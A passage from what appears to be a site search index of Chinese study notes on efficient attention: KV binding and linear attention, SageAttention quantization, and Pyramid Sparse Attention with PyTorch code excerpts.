binding\u5c31\u662f\u5176\u4e2d\u4e00\u4e2a\u65b9\u6848\uff0c\u7ef4\u62a4\u4e00\u4e2a\u56fa\u5b9a\u5927\u5c0f\u7684\u77e9\u9635\uff0c\u5c06\u6bcf\u4e2aKV\u5bf9\u4ee5\u52a0\u6cd5\u7684\u5f62\u5f0f\u5b58\u5165\u8fd9\u4e2a\u77e9\u9635</p> <pre><code>for t in range(T):\n    # \u5199\u5165\uff1a\u5c06 (k_t, v_t) \u7ed1\u5b9a\u8fdb\u8bb0\u5fc6\u77e9\u9635\n    # k_t: (B, D) -&gt; (B, D, 1)\n    # v_t: (B, D) -&gt; (B, 1, D)\n    # \u5916\u79ef: (B, D, D)\n    M = M + torch.bmm(k[:, t, :].unsqueeze(2),\n                      v[:, t, :].unsqueeze(1))\n\n    # \u8bfb\u51fa\uff1a\u7528 q_t \u4ece\u8bb0\u5fc6\u77e9\u9635\u4e2d\u68c0\u7d22\n    # q_t: (B, D) -&gt; (B, 1, D)\n    # o_t: (B, 1, D) -&gt; (B, D)\n    o_t = torch.bmm(q[:, t, :].unsqueeze(1), M).squeeze(1)\n    outputs.append(o_t)\n\nreturn torch.stack(outputs, dim=1)  # (B, T, D)\n</code></pre> <p>\u60f3\u8981\u4ece\u8fd9\u4e2a\u77e9\u9635\u4e2d\u63d0\u53d6\u51faKV\u5bf9\uff0c\u5c31\u7528\u5bf9\u5e94\u7684Q\u53bb\u4e58\u4ee5\u8fd9\u4e2a\u77e9\u9635\uff0c\u4ece\u5f62\u5f0f\u4e0a\u6765\u8bf4\u5c31\u662f\u5bf9\u6240\u6709\u5386\u53f2\u4fe1\u606f\u52a0\u6743\u6c42\u548c\uff0c\u5bf9\u5e94\u7684\u6570\u5b66\u5f62\u5f0f\u662f</p> \\[o_t\u200b=q_t\u200bM=q_t\u200b\\sum_{s\u2264t}\u200bk_sT^\u200bv_s\u200b=\\sum_{s\u2264t}\u200b(q_t\u200bk_s^T\u200b)v_s\u200b\\] <p>\u6211\u4eec\u6765\u5bf9\u6bd4\u6807\u51c6\u7684softmax attention</p> \\[o_t^{\\text{softmax}} = \\sum_{s \\leq t} {softmax}(q_t k_s^T) v_s\\] <p>\u533a\u522b\u6070\u597d\u5c31\u5728\u4e8eSoftmax\u64cd\u4f5c\u5e26\u6765\u7684\u5f52\u4e00\u5316\uff0c\u5e76\u4e14\u53e6\u4e00\u65b9\u9762\uff0cKV binding\u8ba1\u7b97\u5f62\u5f0f\u548cLinear Attention\u662f\u4e00\u81f4\u7684\uff0cLinear Attention\u7684\u6838\u5fc3\u64cd\u4f5c\u6b63\u662f\u53bb\u6389softmax\uff0c\u4ea4\u6362qkv\u7684\u8ba1\u7b97\u987a\u5e8f\u6765\u83b7\u5f97\u7ebf\u6027\u7684\u590d\u6742\u5ea6\uff0c\u4f46\u662f\u7531\u6b64\u6211\u4eec\u4e5f\u77e5\u9053\u4e86KV binding\u81ea\u7136\u4e5f\u5f15\u5165\u4e86Linear Attention\u4f4e\u79e9\u7b49\u7f3a\u9677</p> <p>\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u5efa\u7acb\u4e86KV binding\u548cLinear Attention\u7684\u5173\u8054\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u770bKV binding\u548c\u7ebf\u6027\u5c42TTT\u7684\u5173\u8054\uff0c\u7ebf\u6027\u5c42TTT\u7528\u4e00\u4e2a\u77e9\u9635\u66ff\u4ee3Self-Attention\u5c42\uff0c\u7136\u540e\u6839\u636e\u5176\u68af\u5ea6\u4e0b\u964d\uff0c\u6211\u4eec\u53ef\u4ee5\u63a8\u5bfc\u51fa\u548cKV binding\u548cLinear Attention\u4e00\u81f4\u7684\u8868\u8fbe</p> <p>\u4eba\u4eec\u7528Key-Value\u5bf9\u6765\u8bad\u7ec3\u8fd9\u4e2a\u7ebf\u6027\u5c42\uff0c\u672c\u8d28\u4e0a\u8fd9\u4e2a\u7ebf\u6027\u5c42\u7528\u4e8e\u63d0\u4f9b\u67e5\u627e\u7684\u64cd\u4f5c</p> <p>\u8fd9\u7bc7\u8bba\u6587\u63ed\u793a\u4e86Test Time Training with KV binding\u548cLinear Attention\u7684\u5185\u5728\u8054\u7cfb</p> <p>\u5bf9\u4e8eLinear Attention\uff0c\u6211\u4eec\u77e5\u9053\u5b83\u662f\u901a\u8fc7\u4ea4\u6362Attention\u64cd\u4f5c\u7684\u8ba1\u7b97\u987a\u5e8f\u6765\u8fbe\u5230\u7ebf\u6027\u7684\u8ba1\u7b97\u590d\u6742\u5ea6\uff0c\u5e76\u4e14\u540e\u7eed\u8fd8\u884d\u751f\u51fa\u4e86\u4e00\u7cfb\u5217\u7684SSM\u6a21\u578b\uff0cMamba\u7b49SSM\u6a21\u578b\u548cLinear Attention\u7684\u662f\u540c\u4e00\u7c7b\u6a21\u578b\u7684\u4e0d\u540c\u89c6\u89d2</p> <p>DeltaNet\u88ab\u8bc1\u660e\u4e3a\u662f\u5355\u5c42\u7ebf\u6027\u5c42+\u96f6\u521d\u59cb\u5316\u7684TTT\u7279\u4f8b</p>"},{"location":"reading/interesting/Efficient%20Attention/","title":"Efficient Attention","text":"<p>\u73b0\u9636\u6bb5\u505a\u9ad8\u6548Attention\u7684\u673a\u5236\u4e3b\u8981\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u4f4e\u6bd4\u7279\u77e9\u9635\u8ba1\u7b97\u7684Attention\uff0c\u53e6\u4e00\u79cd\u662f\u7a00\u758f\u7684\u6ce8\u610f\u529b\u673a\u5236</p> <p>\u5176\u5b9e\u8fd8\u5b58\u5728\u53e6\u4e00\u79cd\u9ad8\u6548\u65b9\u6848\u5c31\u662fLinear Attention\uff0c\u5305\u62ec\u662fKimi\u6700\u8fd1\u5728\u505a\u7684\u4e00\u7cfb\u5217\u5de5\u4f5c\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u6848\u8fd8\u672a\u80fd\u505a\u5230\u5b8c\u5168\u7684\u5de5\u4e1a\u573a\u666f\u7684\u843d\u5730</p> <p>\u5728Context Length\u7684\u589e\u957f\u4e2d\uff0cAttention\u8ba1\u7b97\u4f1a\u53d8\u6210\u4e00\u4e2a\u5de8\u5927\u7684\u74f6\u9888\uff0c\u5728\u957f\u6587\u672c\uff0c\u89c6\u9891\u4e4b\u7c7b\u7684\u9886\u57df\u5c24\u5176\u660e\u663e</p> <p></p>"},{"location":"reading/interesting/Efficient%20Attention/#1","title":"1. \u4f4e\u6bd4\u7279\u8ba1\u7b97","text":"<p>\u8fd9\u4e00\u7cfb\u5217\u7684\u4ee3\u8868\u5de5\u4f5c\u4e3b\u8981\u662fSageAttention\uff0c\u5728FP32\u7684Full Attention\u7684\u57fa\u7ebf\u4e2d\u5f15\u5165\u4e86\u5404\u9879\u4f4e\u6bd4\u7279\u673a\u5236</p> <ul> <li>SageAttention1 INT8 + FP16 inference</li> <li>SageAttention2 INT4/INT8 + FP8 inference</li> <li>SageAttention3 FP4 inference FP8 Training</li> </ul> <p>SageAttention\uff0c\u5df2\u7ecf\u96c6\u6210\u5728Diffusers\uff0cTensorRT\u7b49\u5e93\u4e2d\uff0c\u5f88\u591a\u89c6\u9891\u751f\u6210\u4ea7\u54c1\u90fd\u7528\u4e86\uff0c\u53ef\u4ee5\u5728\u5e94\u7528\u7684\u65f6\u5019\u76f4\u63a5\u66ff\u6362FlashAttention\uff0c\u4e00\u884c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u52a0\u901f\uff0c\u5b9e\u73b0\u5373\u63d2\u5373\u7528</p> <p>SageAttention\u4e5f\u662f\u57fa\u4e8eFlashAttention\u4e4b\u4e0a\u7684</p> <p></p>"},{"location":"reading/interesting/Efficient%20Attention/#11-sageattention-1","title":"1.1. SageAttention 1","text":"<p>\u91cf\u5316\u662f\u6df1\u5ea6\u5b66\u4e60\u4e2d\u5f88\u65e9\u671f\u5c31\u6709\u7684\u5de5\u4f5c\uff0c\u4f46\u662f\u65e9\u671f\u7684\u91cf\u5316\u96c6\u4e2d\u5728\u4e8eFFN\u4e0a\u9762\uff0c\u5bf9\u4e8eAttention\u7684\u91cf\u5316\u7814\u7a76\u5f88\u5c11\uff0c\u968f\u7740\u5e8f\u5217\u957f\u5ea6\u7684\u589e\u52a0\uff0cAttention\u7684ON2\u7684\u8ba1\u7b97bound\u8d8a\u53d1\u660e\u663e\uff0c\u5728\u8fd9\u4e2a\u9636\u6bb5\uff0cFlashAttention3\u5df2\u7ecf\u5b9e\u73b0FP8\u7684\u91cf\u5316\uff0c\u4f46\u662f\u8be5\u79cd\u91cf\u5316\u6307\u6807\u53ea\u80fd\u5b9e\u73b0\u5728N\u5361\u7684Hopper\u7684\u67b6\u6784\u4e2d</p> <p>\u5e76\u4e14\u5b9e\u9a8c\u4e2d\u53d1\u73b0\uff0c\u5bf9\u4e8eAttention\u76f4\u63a5\u8fdb\u884c\u91cf\u5316\u6548\u679c\u975e\u5e38\u7cdf\u7cd5\uff0c\u4e0d\u8bba\u662f\u5bf9\u4e8e\u751f\u6210\u8fd8\u662fLLM\uff0c\u4e3b\u8981\u9762\u4e34\u4e24\u4e2a\u95ee\u9898</p> <ul> <li>K\u77e9\u9635\u7684\u79bb\u7fa4\u503c\uff0c\u8fd9\u4e2a\u548c\u4f20\u7edf\u91cf\u5316\u4e2d\u9047\u5230\u7684\u73b0\u8c61\u5f88\u50cf\uff0c\u5728channel\u7ef4\u5ea6\u4e0a\uff0c\u5b58\u5728\u4e00\u4e9bchannel\u4e0a\u7684\u6570\u503c\u8fdc\u8fdc\u5927\u4e8e\u5176\u4ed6channel\uff0c\u5bfc\u81f4\u4f20\u7edf\u91cf\u5316\u7b97\u6cd5\u5931\u6548</li> <li>PV\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u662fsoftmax\u7684\u7ed3\u679c\u548cV\u7684\u8ba1\u7b97\u7684\u65f6\u5019\uff0cP\u7684\u8f93\u51fa\u5206\u5e03\u975e\u5e38\u7a00\u758f\u4e14\u4e0d\u5747\u5300\uff0c\u5bfc\u81f4\u7684\u7ed3\u679c\u4e5f\u662f\u5355\u7eaf\u7684\u91cf\u5316\u5931\u6548</li> </ul> <p></p> <p>\u672c\u6587\u63d0\u51fa\u7684SageAttention\uff0c\u5c06Attention\u4e2d\u7684\u77e9\u9635\u91cf\u5316\u4e3aINT8\uff0cINT8\u7684\u52a0\u901f\u5bf9\u4e8e\u4e0d\u540c\u786c\u4ef6\u7684\u652f\u6301\u66f4\u597d\uff0c\u57283090\uff0c4090\u7b49\u786c\u4ef6\u4e0a\u4e5f\u80fd\u6709\u6548\u52a0\u901f\uff0c\u5e76\u4e14\u5b9e\u73b0\u4e86\u5373\u63d2\u5373\u7528\uff0c\u65e0\u9700\u5fae\u8c03\uff0c\u5e76\u4e14\u5e94\u5bf9\u4e0a\u8ff0\u7684\u51e0\u4e2a\u6311\u6218\uff0cSageAttention\u4e5f\u63d0\u51fa\u4e86\u5e94\u5bf9\u65b9\u6848</p> <ul> <li>Smooth K\uff0c\u6765\u5e73\u6ed1K\u77e9\u9635</li> <li>\u5bf9\u4e8ePV\u8ba1\u7b97\uff0c\u4fdd\u6301\u8fd9\u4e24\u4e2a\u77e9\u9635\u4e3aFP16\uff0c\u5e76\u4e14\u4f7f\u7528low-precision FP16 accumulator</li> </ul> <p>\u5728Smooth K\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5c06K\u77e9\u9635\u90fd\u51cf\u53bbK\u77e9\u9635\u7684\u5747\u503c\uff0c\u5728Channel\u7ef4\u5ea6\u4e0a\u505a\u5f52\u4e00\u5316\uff0c\u5728\u4fdd\u8bc1Softmax\u662f\u65e0\u635f\u7684\u60c5\u51b5\u4e0b\uff0c\u5e73\u6ed1K\u77e9\u9635</p> <p>\u5728\u4f4e\u6bd4\u7279\u91cf\u5316\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u4e24\u4e2a\u5355\u4f4d\u7684\u4e0a\u4e0b\u754c\u4e0d\u540c\uff0c\u56e0\u6b64\u4e00\u822c\u5728\u4f4e\u6bd4\u7279\u91cf\u5316\u4e2d\u9700\u8981\u505a\u4e00\u4e9b\u7f29\u653e\uff0c\u91cf\u5316\u5b8c\u6210\u7684\u77e9\u9635\u8fd8\u4f1a\u5e26\u4e00\u4e2a\u5c0f\u6807\u91cf\uff0c\u5c31\u662f\u4e00\u4e2a\u7f29\u653e\u56e0\u5b50\uff0c\u53ef\u4ee5\u770b\u4e0b\u56fe\u4e2d\u7684 \\(s_q\\) </p> <p></p> <p>\u4e5f\u662f\u5efa\u7acb\u5728FlashAttention\u7684\u57fa\u7840\u4e0a\uff0c\u5bf9\u4e8e\u5206\u5757\u597d\u7684\u77e9\u9635\u5148\u8fdb\u884c\u91cf\u5316\uff0c\u5728 \\(QK^T\\) \u8fd9\u4e2a\u8ba1\u7b97\u4e2d\u4f7f\u7528INT8 \u5728\u6700\u540e\u548c V \u77e9\u9635\u7684\u76f8\u4e58\u4e2d\u4f7f\u7528FP16\uff08\u5b9e\u9a8c\u53d1\u73b0\u8fd9\u4e00\u5757\u5982\u679c\u8fdb\u884c\u91cf\u5316\uff0c\u6548\u679c\u4f1a\u5dee\u5f88\u591a\uff0c\u56e0\u6b64\u5c31\u4f7f\u7528FP16\uff09\uff0c\u4f46\u662f\u8fd9\u90e8\u5206\u4e5f\u505a\u4e86\u4e00\u4e9b\u4f18\u5316\uff0c\u5f15\u5165\u4e86FP16\u7d2f\u52a0\u5668\uff0c\u56e0\u4e3a\u4f20\u7edf\u7684\u77e9\u9635\u4e58\u6cd5\u5728\u7d2f\u52a0\u5668\u8fd9\u4e00\u5757\u7528\u7684\u4ecd\u7136\u662f32\u4f4d\uff0c\u4f46\u662f\u540c\u65f6P\u77e9\u9635\u662fSoftmax\u7684\u7ed3\u679c\uff0c\u5b83\u7684\u5f52\u4e00\u5316\u662f\u4e00\uff0c\u56e0\u6b64\u5728\u7d2f\u52a0\u4e2d\u5f88\u5c11\u4f1a\u6ea2\u51faFP16\u7684\u7ed3\u679c\uff0c\u56e0\u6b64FP32\u7684\u7d2f\u52a0\u662f\u4e0d\u592a\u5fc5\u8981\u7684\uff0c\u56e0\u6b64\u8fd9\u91cc\u7528\u4e0a\u4e86FP16\u7684\u7d2f\u52a0\u5668\uff0c\u53ef\u4ee5\u505a\u5230\u6027\u80fd\u6ca1\u6709\u4ec0\u4e48\u53d8\u5316\u4f46\u662f\u901f\u5ea6\u53d8\u5feb\u4e86</p> <p>\u4f46\u662f\u91cf\u5316\u672c\u8eab\u53d1\u751f\u5728token\u7ef4\u5ea6\u4e0a\uff0c\u4e00\u4e2a\u5e8f\u5217\u7684token\u7684attention\u503c\u5176\u5b9e\u5dee\u5f02\u6ce2\u52a8\u662f\u5f88\u5927\u7684\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u91cf\u5316\u7684\u6548\u679c\u4f1a\u6bd4\u8f83\u7cdf\u7cd5\uff0c\u56e0\u4e3a\u4ed6\u662f\u57fa\u4e8e\u540c\u4e00\u4e2a\u7f29\u653e\u56e0\u5b50\u53bb\u8fdb\u884c\u7f29\u653e\u7684</p> <p>\u5728\u8fd9\u91cc\u5f15\u5165\u4e86\u4e00\u4e2a\u65b0\u7684\u65b9\u6848\u53eb\u505aSmooth K\uff0c\u5176\u7528\u4e8e\u5e73\u5747\u5316\u5e8f\u5217\u4e2d\u7684\u5f02\u5e38\u503c\uff0c\u5176\u5b9e\u5c31\u662f\u51cf\u53bb\u6bcf\u5217\u7684\u5747\u503c\uff0c\u5e76\u4e14\u8fd9\u4e2a\u64cd\u4f5c\u4e0d\u5f71\u54cdsoftmax</p> <p></p>"},{"location":"reading/interesting/Efficient%20Attention/#12-sageattention-2","title":"1.2. SageAttention 2","text":"<p>SageAttention2 \u4e2d\u5f15\u5165\u4e86Per thread\u7684\u91cf\u5316\uff0c\u76f8\u5bf9\u4e8e\u4e4b\u524d\u7684Per Tensor or Per Block\u7684\u8303\u5f0f\uff0c\u7c92\u5ea6\u66f4\u7ec6\uff0c\u7c92\u5ea6\u66f4\u7ec6\u7684\u7ed3\u679c\u5c31\u662f\u91cf\u5316\u7684\u8303\u56f4\u5185\u79bb\u7fa4\u503c\u7684\u66f4\u5c11\uff0c\u6548\u679c\u5c31\u66f4\u597d</p> <p>\u5728SageAttention1\u4e2d\u5176\u5b9e\u6ca1\u6709\u52a8Q\u77e9\u9635\uff0c\u56e0\u4e3aQ\u77e9\u9635\u7684\u79bb\u7fa4\u503c\u76f8\u5bf9\u6bd4\u8f83\u5c11\uff0c\u4f46\u662f\u5728\u5f15\u5165\u4e86INT4\u7684\u91cf\u5316\u7684\u65f6\u5019\uff0c\u5373\u4fbf\u662fQ\u77e9\u9635\u4e5f\u9762\u4e34\u4e86\u5f88\u9ad8\u7684\u7cbe\u5ea6\u635f\u5931\u7684\u98ce\u9669\u3002\u5bf9\u4e8eQ\u77e9\u9635\u7684\u91cf\u5316\u76f8\u5bf9\u66f4\u52a0\u9ebb\u70e6\u4e00\u70b9</p> <p></p>"},{"location":"reading/interesting/Efficient%20Attention/#why-outliers-in-llm","title":"why outliers in LLM","text":"<p>\u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u91cf\u5316\u7684\u884c\u4e3a\u662f\u5c06\u6d6e\u70b9\u6570\u6620\u5c04\u5230\u4f4e\u7ef4\u7a7a\u95f4</p> <p>$\\(Q[x]=scale*Clamp( \\left \\lfloor \\frac{x}{scale} \\right \\rceil,min,max)\\)$ \u5176\u4e2d\u7684\\(\\left \\lfloor \u00b7 \\right \\rceil\\) \u662f\u820d\u5165\u7b26\u53f7\uff0c\u5bf9\u4e8ek\u4f4d\u91cf\u5316\uff0c\u6211\u4eec\u4f1a\u8bbe\u5b9a</p> <ul> <li>\\(min=-2^{k-1}\\)</li> <li>\\(max = 2^{k-1}\\)</li> <li>\\(scale = \\frac{|x|_{max}}{2^{k-1}}\\) </li> </ul> <p>\u8fd9\u4e2a\u884c\u4e3a\u5c06\u6240\u6709\u7684\u6570\u5b57\u5f52\u4e00\u5316\u9053min\uff5emax\u8fd9\u4e2a\u8303\u56f4\u5185\uff0c\u4f46\u662fLLM\u4e2d\u5b58\u5728\u4e00\u7cfb\u5217\u7684\u79bb\u7fa4\u503c\uff0c\u8fd9\u4e9b\u79bb\u7fa4\u503c\u5bfc\u81f4\u76f4\u63a5\u7528max\u6570\u503c\u8fdb\u884c\u91cf\u5316\u4f1a\u635f\u5931\u5f88\u5927\u7684\u7cbe\u5ea6\uff0c\u4f46\u662f\u8fd9\u4e9b\u79bb\u7fa4\u503c\u53c8\u5bf9LLM\u7684\u6027\u80fd\u6709\u5f88\u5927\u7684\u8d21\u732e</p>"},{"location":"reading/interesting/Efficient%20Attention/#2-sparse-attention","title":"2. Sparse Attention","text":"<p>\u8fd9\u90e8\u5206\u7684\u4e3b\u8981\u5de5\u4f5c\u662fSparge Attention\u7b49\u4e00\u7cfb\u5217\u7684\u5de5\u4f5c\uff0c\u5e76\u4e14\u4ed6\u4eec\u90fd\u662f\u5efa\u7acb\u5728Saged Attention\u4e4b\u4e0a\u7684</p>"},{"location":"reading/interesting/Efficient%20Attention/#21-pyramid-sparse-attention","title":"2.1 Pyramid Sparse Attention","text":"<p>PSA \u8fd9\u7bc7\u662f\u7a00\u758f\u6ce8\u610f\u529b\u7684\u4e00\u4e2a\u8fdb\u9636\u7248\u672c\uff0cPyramid Sparse Attention\uff0c\u91d1\u5b57\u5854\u5f62\u7684\u7a00\u758f\u6ce8\u610f\u529b\u673a\u5236</p> <p></p> <p>\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5b83\u7684\u5b9e\u73b0\uff0c\u4e5f\u8fc7\u4e00\u4e0b\u5b9e\u73b0\u4e00\u4e2aSparse Attention\u673a\u5236\u7684\u6d41\u7a0b\u3002\u4e00\u5f00\u59cb\u4e5f\u548c\u6211\u4eec\u81ea\u5b9a\u4e49\u4efb\u4f55\u4e00\u4e2aAttention\u4e00\u6837\u7ee7\u627f\u4e00\u4e2aModule\uff0c\u7136\u540e\u5b9e\u73b0forward</p> <pre><code>class PyramidSparseAttention(nn.Module):\n    def __init__(self, config: AttentionConfig = None, inference_num=50, layer_num=42, model_type=\"wan\"):\n        super().__init__()\n        # If config not provided, use default config\n        if config is None:\n            config = AttentionConfig()\n        self.config = config\n        ...\n\n    def forward(self, q, k, v, layer_idx):\n        ...\n</code></pre> <p>\u6211\u4eec\u6765\u770b\u5b83\u7684\u6838\u5fc3\u90e8\u5206\uff0c\u4e5f\u5c31\u662fforward\u8fc7\u7a0b\uff0c\u9996\u5148\u7ecf\u8fc7\u7684rearrange\u7684\u5224\u65ad\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u5c06\u8bed\u4e49\u76f8\u8fd1\u7684token\u7684\u6392\u5e8f\u5728\u4e00\u8d77\uff0c\u63d0\u9ad8\u5c40\u90e8\u6027</p> <pre><code>if self.use_rearrange:\n    if self.config.rearrange_method == 'Gilbert':\n        q_r, k_r, v_r = self.gilbert_rearranger.rearrange(q, k, v)\n        q_sorted_indices = None\n    elif self.config.rearrange_method == 'SemanticAware':\n        q_r, k_r, v_r, q_sorted_indices = self.semantic_aware_rearranger_list[layer_idx].semantic_aware_permutation(q, k, v)\n    elif self.config.rearrange_method == 'STA':\n        q_r, k_r, v_r = self.STARearranger.rearrange(q, k, v)\n        q_sorted_indices = None\n    elif self.config.rearrange_method == 'Hybrid':\n        q_r, k_r, v_r, q_sorted_indices = self.hybrid_rearranger_list[layer_idx].rearrange(q, k, v)\n    else:\n        raise ValueError(f\"Unknown rearrange_method: {self.config.rearrange_method}\")\nelse:\n    q_r = q\n    k_r = k\n    v_r = v\n    q_sorted_indices = None\n</code></pre> <p>\u7ecf\u8fc7rerange\u4e4b\u540e\u6211\u4eec\u5c31\u8fdb\u5165\u6838\u5fc3\u90e8\u5206\uff0c\u4e5f\u5c31\u662fAttention\u5c42\u7684\u8ba1\u7b97\uff0c\u8fd9\u91cc\u7684<code>adaptive_block_sparse_attn</code>\u662f\u6574\u4e2a\u6d41\u7a0b\u7684\u6838\u5fc3</p> <pre><code>if is_warmup:\n    out_r = torch.nn.functional.scaled_dot_product_attention(q_r, k_r, v_r)\n    sparsity = 0.0\n    per_head_density = [1.0] * q_r.shape[1] if compute_stats else []\n    sim_mask = None\nelse:\n    out_r, sparsity, per_head_density, sim_mask = adaptive_block_sparse_attn(\n        q_r, k_r, v_r, self.config, self.sparse_attention_fn, compute_stats=compute_stats\n    )\n    # Update sparsity statistics only if computing stats\n    if compute_stats:\n        self.sparsity_acc += sparsity\n</code></pre> <p>\u6211\u4eec\u6765\u770b\u8fd9\u4e2afunction\u7684\u5b9e\u73b0\uff0c\u8fd9\u4e2afunction\u6709\u4e09\u4e2a\u4e3b\u8981\u7684Step</p> <ul> <li>Pooling</li> <li>Mask</li> <li>Attention Compute</li> </ul> <pre><code># Disable gradient tracking for pooling and mask operations\nwith torch.no_grad():\n    # STEP 1\n    pooling, sim_mask = efficient_attn_with_pooling(q, k, v, config, num_keep_m=block_size_m//4, num_keep_n=block_size_n//4)\n    # Support both attn_impl and mask_mode methods\n    # STEP2\n    if config.attn_impl == \"old_mask_type\":\n        mask = transfer_attn_to_mask(pooling, config.mask_ratios, config.text_length, mode=config.mask_mode, blocksize=config.block_n, compute_tile=config.tile_n)\n    elif config.attn_impl == \"new_mask_type\":\n        # Use mask_mode parameter, supports topk and thresholdbound\n        mode_map = {\n            'topk': 'topk_newtype',\n            'thresholdbound': 'thresholdbound_newtype'\n        }\n        mode = mode_map.get(config.mask_mode, 'topk_newtype')\n        mask = transfer_attn_to_mask(pooling, config.mask_ratios, config.text_length, mode=mode, blocksize=config.block_n, compute_tile=config.tile_n)\n    else:\n        raise ValueError(f\"Unknown attn_impl: {config.attn_impl}\")\nuse_sim_mask = getattr(config, \"use_sim_mask\", True)\nif use_sim_mask and sim_mask is not None:\n    if sim_mask.dtype != mask.dtype:\n        sim_mask = sim_mask.to(mask.dtype)\n    fixed_mask = torch.min(sim_mask, mask)\nelse:\n    fixed_mask = mask\n# STEP3\nout = sparse_attention_fn(q.contiguous(), k.contiguous(), v.contiguous(), fixed_mask, None)\n</code></pre> <p>\u90a3\u4e48\u9996\u5148\u6211\u4eec\u6765\u770bPooling\uff0c\u8fd9\u4e2a\u6838\u5fc3\u5c31\u5e72\u4e86\u4ee5\u4e0b\u5185\u5bb9\uff0c\u5c06QK\u77e9\u9635\u5212\u5206Block\uff0c\u4ece\u6bcf\u4e2aBlock\u4e2d\u968f\u673a\u91c7\u6837\u51e0\u4e2aToken\uff0c\u4ee5\u8fd9\u51e0\u4e2aToken\u4e3a\u4ee3\u8868\u8ba1\u7b97Attention Score\uff0c\u6700\u540e\u8fd4\u56de\u7684\u662f\u4ee5Block\u4e3a\u7ef4\u5ea6\u7684Attention Matrix</p> <pre><code>  \u539f\u59cbQ, K: [B, H, 1024, 64]\n             \u2193\n  [Pad to block_size\u7684\u500d\u6570]\n             \u2193\n  Q_padded: [B, H, 1024, 64]  (\u5047\u8bbe\u5df2\u5bf9\u9f50)\n  K_padded: [B, H, 1024, 64]\n             \u2193\n  [\u968f\u673a\u91c7\u6837\uff1a\u6bcf\u5757128\u4e2atoken\u91c732\u4e2a]\n             \u2193\n  sampled_Q: [B, H, 256, 64]  (8\u5757 \u00d7 32\u91c7\u6837)\n  sampled_K: [B, H, 256, 64]\n             \u2193\n  [Triton kernel\u8ba1\u7b97\u6ce8\u610f\u529b\u5e76\u5757\u5185pooling]\n             \u2193\n  pooling: [B, H, 8, 8]  # 8\u00d78\u7684\u5757\u7ea7\u91cd\u8981\u6027\u77e9\u9635!\n           \u2193\n  [\u914d\u5408sim_mask\u751f\u6210\u7a00\u758fmask]\n</code></pre> <p>\u5728Pooling\u4e2d\u8fd8\u4f7f\u7528\u4e86\u53e6\u4e00\u4e2a\u673a\u5236\uff0c\u751f\u6210\u4e86\u4e00\u4e2asim_mask\u8fd9\u4e2a\u4e1c\u897f\u662f\u8861\u91cf\u4e86K\u77e9\u9635block\u5185\u90e8\u7684\u76f8\u4f3c\u5ea6\uff0cblock\u5185\u90e8\u7684\u76f8\u4f3c\u5ea6\u8861\u91cf\u4e86\u8fd9\u4e2ablock\u5e94\u8be5\u88ab\u538b\u7f29\u7684\u7a0b\u5ea6\uff0c\u5982\u679c\u8fd9\u91cc\u9762\u7684token\u90fd\u5f88\u76f8\u4f3c\u7684\u8bdd\uff0c\u5c31\u80fd\u88ab\u5f88\u597d\u7684\u538b\u7f29\uff0c\u8fd9\u4e5f\u4e0e\u524d\u9762\u63d0\u5230\u7684rerange\u7684\u8fc7\u7a0b\u76f8\u4e92\u547c\u5e94</p> <p>\u5176\u6b21\u6211\u4eec\u6765\u770bMask\u7684\u8fc7\u7a0b\uff0cMask\u8fc7\u7a0b\u5229\u7528\u4e0a\u8ff0Pooling\u7684\u7ed3\u679c\uff0c\u5c06\u7a00\u758f\u8ba1\u7b97\u9700\u8981\u7684\u4fe1\u606f\u4f20\u9012\u7ed9\u4e0b\u4e00\u6b65\u771f\u6b63\u7684Attention\u8ba1\u7b97\uff0c\u8ba1\u7b97Mask\u6709\u4e24\u79cd\u65b9\u5f0f\uff0cTopK\u548cThresholdBound</p> <pre><code>def transfer_attn_to_mask(\n    attn: torch.Tensor,\n    mask_ratios: Optional[Dict[int, Tuple[float, float]]] = None,\n    text_length: int = 226,\n    mode: str = \"topk\",\n    min_full_attn_ratio: float = 0.06,\n    blocksize=32,\n    compute_tile=32\n) -&gt; torch.Tensor:\n    \"\"\"\n    Convert attention weights to multi-level pooling mask matrix.\n\n    Args:\n        attn (torch.Tensor): Attention weight matrix, shape [batch, head, seq, seq]\n        mask_ratios (dict): Mask value to percentage range mapping, format {mask_value: (start_ratio, end_ratio)}\n                           Default is {1: (0.0, 0.05), 2: (0.05, 0.15), 4: (0.15, 0.55), 8: (0.55, 1.0)}\n                           Other positions have mask=0 (skip)\n        text_length (int): Text sequence length, used to calculate special token positions\n        mode (str): Mask generation mode, 'topk' or 'thresholdbound'\n                   - 'topk': Generate mask based on sorted position range\n                   - 'thresholdbound': Generate mask based on cumulative energy percentage\n                   - 'topk_newtype': topk new format mask\n                   - 'thresholdbound_newtype': thresholdbound new format mask\n        min_full_attn_ratio (float): Minimum interval ratio when mask_value=1, default 0.05 (5%)\n                                     Ensures full attention interval occupies at least this ratio\n\n    Returns:\n        torch.Tensor: Multi-level mask matrix, same shape as input\n        - 0: skip (no attention computation)\n        - 1: full attention (default top 5%)\n        - 2: 2x pooling (default 5%-15%)\n        - 4: 4x pooling (default 15%-55%)\n        - 8: 8x pooling (default 55%-100%)\n    \"\"\"\n</code></pre> <p>\u8be5Function\u6700\u540e\u8fd4\u56de\u7ed9\u6211\u4eec\u4e00\u4e2aMask\u77e9\u9635\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u5b9e\u73b0\u975e\u5e38\u7684\u957f\uff0c\u76ee\u524d\u8fd8\u5728\u8fed\u4ee3\u4e2d\uff0c\u56e0\u6b64\u91c7\u7528\u4e86\u591a\u79cd\u65b9\u6848</p> 